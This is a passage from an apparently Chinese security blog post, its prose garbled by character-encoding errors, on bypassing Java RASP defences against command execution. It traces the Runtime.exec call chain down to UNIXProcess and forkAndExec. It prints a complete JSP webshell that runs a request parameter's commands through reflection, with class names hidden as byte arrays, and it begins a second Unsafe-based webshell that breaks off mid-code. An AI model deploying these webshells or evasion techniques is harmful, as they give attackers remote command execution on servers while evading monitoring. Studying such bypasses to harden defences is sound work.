è½½ï¼Œæ‰€ä»¥è¦ç”¨loadLibraryæ–¹æ³•åŠ è½½dllçš„è¯éœ€è¦ç¡®ä¿dllåœ¨æœå¯»è·¯å¾„ä¸‹é¢</p></blockquote><p>æ‰§è¡Œå°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†</p><p><img src="https://cdn.clown2024.cn/image-20241107204035199.png" alt="image-20241107204035199"></p><p>æ‰€ä»¥å…¶å®ç»•è¿‡å°±æ˜¯èƒ½æŠŠæˆ‘ä»¬å†™çš„soä¸Šä¼ çš„æœåŠ¡å½“ä¸­å»ï¼Œå¯ä»¥é€šè¿‡javaçš„webshellã€æ–‡ä»¶ä¸Šä¼ ã€æˆ–è€…ååºåˆ—åŒ–ç­‰æ–¹å¼ï¼ŒåŠ è½½æˆ‘ä»¬å†™å¥½çš„soæˆ–è€…dll</p><p>è¿™é‡Œæœ‰ä¸€äº›JNIå‘½ä»¤æ‰§è¡Œçš„è„šæœ¬ä¾‹å­ï¼š<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><h1 id="unixprocessç»•è¿‡"><a href="#UNIXProcessç»•è¿‡" class="headerlink" title="UNIXProcessç»•è¿‡"></a>UNIXProcessç»•è¿‡</h1><p>è¯´å®è¯ä¸€å¼€å§‹çœ‹åˆ°è¿™ä¸ªä¸œè¥¿æˆ‘æ˜¯å¾ˆæ‡µçš„ï¼Œæ ¹æœ¬æ²¡å¬è¿‡ï¼Œçœ‹äº†ä¸€ä¸‹æ‰çŸ¥é“è¿™ä¸ªæ˜¯Runtime.exec()è°ƒç”¨é“¾çš„æœ«ç«¯ï¼Œå¹³æ—¶åªä¼šç”¨å¹¶æ²¡æœ‰å…³æ³¨è¿‡ç›¸å…³çš„è°ƒç”¨é“¾</p><p>RASPæœ‰äº›é’ˆå¯¹å‘½ä»¤æ‰§è¡Œçš„è¿‡æ»¤å°±æ˜¯å¯¹è°ƒç”¨é“¾ä¸­çš„<strong>java.lang.ProcessImpl.start</strong>æ–¹æ³•è¿›è¡Œè¿‡æ»¤ã€‚</p><p><strong>é‚£æ¥åˆ†æä¸€ä¸‹å‘½ä»¤æ‰§è¡Œçš„è°ƒç”¨é“¾</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><code>Runtime.exec(xxx)</code>è°ƒç”¨é“¾å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:247)<br>java.lang.ProcessImpl.start(ProcessImpl.java:134)<br>java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)<br>java.lang.Runtime.exec(Runtime.java:620)<br>java.lang.Runtime.exec(Runtime.java:450)<br>java.lang.Runtime.exec(Runtime.java:347)<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¹³æ—¶ç”¨çš„ProcessBuilder.startçš„æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ä¹Ÿå¤„äºè¿™ä¸ªè°ƒç”¨é“¾ä¸Š</p><p>ProcessBuilderæ‰§è¡Œå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc&quot;</span>).start();<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„è°ƒç”¨æ ˆæ˜¯Linuxçš„ï¼Œä»å­—é¢ä¹Ÿå¯ä»¥çœ‹å¾—åˆ°è¿™æ˜¯UNIXProcessï¼ŒWindowsçš„è¯æˆ‘è‡ªå·±è·Ÿè¿›å‘ç°ä»–å’ŒLinuxä¸åŒçš„å°±æ˜¯æœ€ç»ˆé‚£ä¸€æ­¥ï¼ŒUNIXProcesså˜æˆProcessImpl.create</p><p><img src="https://cdn.clown2024.cn/image-20241108135939928.png" alt="image-20241108135939928"></p><p>åœ¨è¯¥nativeæ–¹æ³•å®ç°é‡Œé¢å°±ä¼šè°ƒç”¨Windowsçš„apiæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹</p><p>è¿™é‡Œè¿˜æ˜¯ç»§ç»­è·Ÿç€æ–‡ç« çš„Linuxç‰ˆæœ¬æ¥åˆ†æï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…³æ³¨çš„å°±æ˜¯<code>UNIXProcess</code>å’Œ<code>ProcessImpl</code>ï¼Œåœ¨JDK9ä¹‹åæŠŠ<code>UNIXProcess</code>åˆå¹¶åˆ°äº†<code>ProcessImpl</code>å½“ä¸­</p><p>ä»–ä»¬æœ€ç»ˆè°ƒç”¨çš„nativeæ–¹æ³•æ˜¯forkAndExecæ–¹æ³•ï¼Œå¦‚æ–¹æ³•åæ‰€è¿°ä¸»è¦æ˜¯é€šè¿‡<code>fork&amp;exec</code>æ¥æ‰§è¡Œæœ¬åœ°ç³»ç»Ÿå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">forkAndExec</span><span class="hljs-params">(<span class="hljs-type">int</span> mode, <span class="hljs-type">byte</span>[] helperpath,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] prog,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] argBlock, <span class="hljs-type">int</span> argc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] envBlock, <span class="hljs-type">int</span> envc,</span><br><span class="hljs-params">                                   <span class="hljs-type">byte</span>[] dir,</span><br><span class="hljs-params">                                   <span class="hljs-type">int</span>[] fds,</span><br><span class="hljs-params">                                   <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç»•è¿‡RASPé˜²å¾¡çš„åŸç†å°±æ˜¯ä»–ä»¬é˜²å¾¡çš„å±‚æ•°ä¸å¤Ÿæ·±ï¼Œæ¯”å¦‚åªåˆ°<code>ProcessBuilder.start()</code>æ–¹æ³•ï¼Œè€Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥è°ƒç”¨æœ€ç»ˆæ‰§è¡Œçš„<code>UNIXProcess/ProcessImpl</code>å®ç°å‘½ä»¤æ‰§è¡Œæˆ–è€…ç›´æ¥åå°„<code>UNIXProcess/ProcessImpl</code>çš„<code>forkAndExec</code>æ–¹æ³•å°±å¯ä»¥ç»•è¿‡RASPå®ç°å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>è¿™æ˜¯ProcessImplå®ä¾‹åŒ–UNIXProcessçš„æºç ï¼Œä¸»è¦æ˜¯çœ‹çœ‹å‚æ•°ä¼ é€’</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImpl</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> sun.misc.<span class="hljs-type">JavaIOFileDescriptorAccess</span> <span class="hljs-variable">fdAccess</span><br>        <span class="hljs-operator">=</span> sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ProcessImpl</span><span class="hljs-params">()</span> &#123;&#125;    <span class="hljs-comment">// Not instantiable</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                         result, <span class="hljs-number">0</span>,<br>                         bytes.length);<br>        result[result.length-<span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>)<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">start</span><span class="hljs-params">(String[] cmdarray,</span><br><span class="hljs-params">                         java.util.Map&lt;String,String&gt; environment,</span><br><span class="hljs-params">                         String dir,</span><br><span class="hljs-params">                         ProcessBuilder.Redirect[] redirects,</span><br><span class="hljs-params">                         <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-keyword">assert</span> cmdarray != <span class="hljs-literal">null</span> &amp;&amp; cmdarray.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[cmdarray.length-<span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = cmdarray[i+<span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span>[] envc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">byte</span>[] envBlock = ProcessEnvironment.toEnvironmentBlock(environment, envc);<br><br>        <span class="hljs-type">int</span>[] std_fds;<br><br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (redirects == <span class="hljs-literal">null</span>) &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123; -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span> &#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">1</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">1</span>].file(),<br>                                              redirects[<span class="hljs-number">1</span>].append());<br>                    std_fds[<span class="hljs-number">1</span>] = fdAccess.get(f1.getFD());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">2</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">2</span>].file(),<br>                                              redirects[<span class="hljs-number">2</span>].append());<br>                    std_fds[<span class="hljs-number">2</span>] = fdAccess.get(f2.getFD());<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UNIXProcess</span><br>            (toCString(cmdarray[<span class="hljs-number">0</span>]),<br>             argBlock, args.length,<br>             envBlock, envc[<span class="hljs-number">0</span>],<br>             toCString(dir),<br>                 std_fds,<br>             redirectErrorStream);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close(); &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close(); &#125;<br>                <span class="hljs-keyword">finally</span> &#123; <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close(); &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>UNIXProcessæ¥æ”¶ 8ä¸ªå‚æ•°ï¼Œå…¶ä¸­envcæ˜¯[1]ä¸std_fdséƒ½æ˜¯æ’ä¸º-1çš„æ•°ç»„ï¼ŒredirectErrorStreamä¸å½±å“å¯ä¸ºfalseï¼Œargs.length ä¸º cmd.length - 1ï¼ŒargBlockçš„å†…å®¹å°±æ˜¯æ‰§è¡Œçš„å‘½ä»¤å†…å®¹ã€‚</p></blockquote><p>ä¸€ä¸ªjspçš„payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>, result, <span class="hljs-number">0</span>, bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    InputStream <span class="hljs-title function_">start</span><span class="hljs-params">(String[] strs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// java.lang.UNIXProcess</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">unixClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        <span class="hljs-comment">// java.lang.ProcessImpl</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// åå°„åˆ›å»ºUNIXProcessæˆ–è€…ProcessImpl</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            clazz = Class.forName(unixClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            clazz = Class.forName(processClass);<br>        &#125;<br>        <span class="hljs-comment">// è·å–UNIXProcessæˆ–è€…ProcessImplçš„æ„é€ æ–¹æ³•</span><br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">assert</span> strs != <span class="hljs-literal">null</span> &amp;&amp; strs.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span><br>        <span class="hljs-comment">// memory management in Java than in C.</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>        &#125;<br>        <span class="hljs-type">int</span>[] envc    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// In theory, close() can throw IOException</span><br>        <span class="hljs-comment">// (although it is rather unlikely to happen here)</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close();<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// åˆ›å»ºUNIXProcessæˆ–è€…ProcessImplå®ä¾‹</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(<br>                toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        );<br>        <span class="hljs-comment">// è·å–å‘½ä»¤æ‰§è¡Œçš„InputStream</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">inMethod</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        inMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (InputStream) inMethod.invoke(object);<br>    &#125;<br>    String <span class="hljs-title function_">inputStreamToString</span><span class="hljs-params">(InputStream in, String charset)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (charset == <span class="hljs-literal">null</span>) &#123;<br>                charset = <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>            &#125;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>   <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[]                b   = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                out.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(out.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)<br>                in.close();<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] str = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span>     <span class="hljs-operator">=</span> start(str);<br>        <span class="hljs-type">String</span>      <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> inputStreamToString(in, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(result);<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="unsafeforkandexecç»•è¿‡"><a href="#Unsafe-forkAndExecç»•è¿‡" class="headerlink" title="Unsafe+forkAndExecç»•è¿‡"></a>Unsafe+forkAndExecç»•è¿‡</h2><p>é‚£å¦‚æœRASPæŠŠ<code>UNIXProcess/ProcessImpl</code>ç±»çš„æ„é€ æ–¹æ³•ç»™æ‹¦æˆªäº†å‘¢</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨javaçš„ä¸€äº›ç‰¹æ€§æ¥ç›´æ¥è§¦å‘<code>forkAndExec</code>æ–¹æ³•ä»è€Œç»•è¿‡è¿‡æ»¤</p><p>å…·ä½“çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ä½¿ç”¨<code>sun.misc.Unsafe.allocateInstance(Class)</code>ç‰¹æ€§å¯ä»¥æ— éœ€<code>new</code>æˆ–è€…<code>newInstance</code>åˆ›å»º<code>UNIXProcess/ProcessImpl</code>ç±»å¯¹è±¡ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>forkAndExec</code>æ–¹æ³•ã€‚</li><li>æ„é€ <code>forkAndExec</code>éœ€è¦çš„å‚æ•°å¹¶è°ƒç”¨ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>initStreams</code>æ–¹æ³•åˆå§‹åŒ–è¾“å…¥è¾“å‡ºç»“æœæµå¯¹è±¡ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>getInputStream</code>æ–¹æ³•è·å–æœ¬åœ°å‘½ä»¤æ‰§è¡Œç»“æœ(å¦‚æœè¦è¾“å‡ºæµã€å¼‚å¸¸æµåå°„å¯¹åº”æ–¹æ³•å³å¯)ã€‚</li></ol><p>å› ä¸ºä¸å¤ªå¥½éªŒè¯ï¼Œç›´æ¥copyä¸€ä¸‹Aiwinå¸ˆå‚…çš„jsp payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] strs = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (strs != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>); <span class="hljs-comment">//é€šè¿‡getæ–¹æ³•å¾—åˆ°unsafeå¯¹è±¡</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<span class="hljs-comment">//åˆ›å»ºUNIXProcesså¯¹è±¡</span><br>        <span class="hljs-comment">//åŸä»£ç </span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span 